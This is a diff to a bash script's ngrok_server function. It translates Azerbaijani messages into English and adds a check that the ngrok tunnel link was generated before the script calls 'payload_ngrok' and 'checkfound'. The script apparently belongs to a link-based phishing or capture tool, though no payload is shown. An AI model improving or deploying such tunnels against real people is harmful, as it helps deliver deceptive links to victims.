@@ -187,22 +187,23 @@ ngrok_server() {
     fi
 
 
-printf "\e[1;92m[\e[0m+\e[1;92m] PHP server basladilir...\n"
-php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
-sleep 2
-printf "\e[1;92m[\e[0m+\e[1;92m] Ngrok server basladilir...\n"
-./ngrok http 3333 > /dev/null 2>&1 &
-sleep 10
+printf "\e[1;92m[\e[0m+\e[1;92m] Starting PHP server...\n"
+    php -S 127.0.0.1:3333 > /dev/null 2>&1 &
+    sleep 2
+    printf "\e[1;92m[\e[0m+\e[1;92m] Starting Ngrok server...\n"
+    ./ngrok http 3333 > /dev/null 2>&1 &
+    sleep 15  # Increased wait time to ensure Ngrok is fully running
 
+    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9A-Za-z.-]*\.ngrok.io")
+    if [ -z "$link" ]; then
+        printf "\e[1;93m[!] Ngrok link not generated. Check your setup or internet connection.\e[0m\n"
+        exit 1
+    fi
+    printf "\e[1;92m[\e[0m*\e[1;92m] Ngrok link:\e[0m\e[1;77m %s\e[0m\n" $link
 
-link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9A-Za-z.-]*\.ngrok.io")
-printf "\e[1;92m[\e[0m*\e[1;92m] Link:\e[0m\e[1;77m %s\e[0m\n" $link
-
-
-payload_ngrok
-checkfound
+    payload_ngrok
+    checkfound
 }
-
 
 start1() {
 if [[ -e sendlink ]]; then
